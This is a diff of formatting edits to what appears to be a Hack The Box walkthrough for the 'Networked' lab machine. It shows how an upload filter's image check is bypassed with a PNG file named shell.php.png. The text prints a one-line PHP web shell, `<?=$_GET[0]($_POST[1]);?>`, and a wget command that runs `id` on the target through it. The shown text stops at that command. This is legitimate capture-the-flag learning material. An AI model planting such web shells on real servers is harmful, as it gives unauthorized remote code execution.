@@ -249,20 +249,20 @@ So, given my poor php comprehension I believe this is checking for valid image e
 Navigating to http://10.10.10.146/upload.php, it looks like it matches what we can see in the upload.php file itself. I created a test.txt file and tried to upload it. Sure enough - I was denied due to file type. I wanted to test to make sure it was functioning to allow so I found a random jpg image (A-10s are the best) and successfully uploaded it to 10.10.10.146/photos.php
 
 ![Warthog](./images/warthog.jpg)  
-\ **Figure 1:** Warthog
+**Figure 1:** Warthog
 
 In googling around for something that someone that I could use to leverage this I came across a [shell that gets embedded in the idat chunks of a png file](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)
 
-I got a non-image result when I re-named that exact file "shell.php.png". This seems like a promising format for how to upload and still get it to execute the code. Now I need to figure out how to use the shell
+I got a non-image result when I re-named that exact file `shell.php.png`. This seems like a promising format for how to upload and still get it to execute the code. Now I need to figure out how to use the shell:
 
-my payload is this:
+The payload in the image is this:
 ```php
 <?=$_GET[0]($_POST[1]);?>
 ```
 So given the url
 ```http://website.com/cmd.php?0=shell_exec -d 1=id```
 
-In the URL, **?0=cmd** is the command passed through a GET variable, and I pass **1=id** as a POST variable.
+In the URL, `**?0=cmd**` is the command passed through a GET variable, and I pass `**1=id**` as a POST variable.
 
 ```console
 root@endeavour:~/htb/networked# wget -q -O - http://10.10.10.146/uploads/10_10_14_75.php.png?0=shell_exec --post-data="1=id"
